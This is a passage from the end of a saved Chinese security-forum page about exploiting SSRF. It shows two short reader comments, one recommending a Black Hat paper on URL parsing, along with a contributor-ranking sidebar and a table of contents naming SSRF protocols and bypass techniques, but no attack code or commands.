                                <img class="avatar pull-left tiny-avatar" src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                            <span class="post-info ">
                                 
                                <a class="label label-default" href="https://xz.aliyun.com/u/42780">1nhann</a>
                                
                                <span class="bbs-time">2022-04-19 16:59:20</span>
                                
                            </span>
                            <div class="post-content markdown-body">
                                <p>学 ssrf 推荐阅读：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>

                            </div>
                            <div class="manual-box">
                                <span class="thumbs " data-action="post" data-pk="18152" data-topic="11215"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
                                <span class="reply-jump reply reply-count " data-nickname="1nhann">回复Ta</span>
                            </div>
                        </div>

                        <hr>
                    </li>
                </ul>
            
                <ul class="post-info" id="reply-18153">
                    <li>
                        <div class="row1 user-info clearfix">
                            
                                <img class="avatar pull-left tiny-avatar" src="./浅析SSRF的各种利用方式 - 先知社区_files/46194_cae24e3d192e6ad4e9.png">
                            
                            <span class="post-info ">
                                 
                                <a class="label label-default" href="https://xz.aliyun.com/u/46194">laodu</a>
                                
                                <span class="bbs-time">2022-04-20 20:02:51</span>
                                
                            </span>
                            <div class="post-content markdown-body">
                                <p><a href="https://xz.aliyun.com/u/42780" target="_blank">@1nhann</a> 谢谢师傅</p>

                            </div>
                            <div class="manual-box">
                                <span class="thumbs " data-action="post" data-pk="18153" data-topic="11215"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
                                <span class="reply-jump reply reply-count " data-nickname="laodu">回复Ta</span>
                            </div>
                        </div>

                        <hr>
                    </li>
                </ul>
            
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11215&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11215&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>



    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year">
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month">
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
                            <span class="num-box">
                                <span class="badge badge-important">54</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
                            <span class="num-box">
                                <span class="badge badge-important">8</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/15858_1a385b86ba5eb88d54.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
                            <span class="num-box">
                                <span class="badge badge-important">4</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
                            <span class="num-box">
                                <span class="badge badge-important">3</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/49315_e954e2786775c5324a.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
                            <span class="num-box">
                                <span class="badge badge-important">2</span>
                            </span>
                        </div>
                    </div>
                
                     <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="./浅析SSRF的各种利用方式 - 先知社区_files/default_avatar.png">
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
                            <span class="num-box">
                                <span class="badge badge-important">1</span>
                            </span>
                        </div>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box" id="toc-container" style="width: 257px;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
            <ol><li><a href="https://xz.aliyun.com/t/11215#toc-0">SSRF攻击中涉及的一些协议</a><ol><li><a href="https://xz.aliyun.com/t/11215#toc-1">http协议</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-2">dict协议</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-3">file伪协议</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-4">Gopher协议</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-5">FastCGI协议</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-6">Redis协议</a></li></ol></li><li><a href="https://xz.aliyun.com/t/11215#toc-7">常见的bypass绕过方式</a><ol><li><a href="https://xz.aliyun.com/t/11215#toc-8">URL    Bypass</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-9">数字IP Bypass</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-10">302跳转 Bypass</a></li><li><a href="https://xz.aliyun.com/t/11215#toc-11">DNS重绑定 Bypass</a></li></ol></li></ol></div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart);
            $("[data-toggle='tooltip']").tooltip();

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>


        </div>
    </div>


</div>
<footer class="bs-docs-footer" translate="no">
    <div class="container text-center">
        <div class="links">
            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
        </div>
    </div>
</footer>

<script src="./浅析SSRF的各种利用方式 - 先知社区_files/bootstrap.min.js.下载"></script>
<script src="./浅析SSRF的各种利用方式 - 先知社区_files/xz.js.下载"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11215&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11215&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
            $("[data-toggle='tooltip']").tooltip();
        });
    </script>


    <script src="./浅析SSRF的各种利用方式 - 先知社区_files/z_stat.php"></script>


</body></html>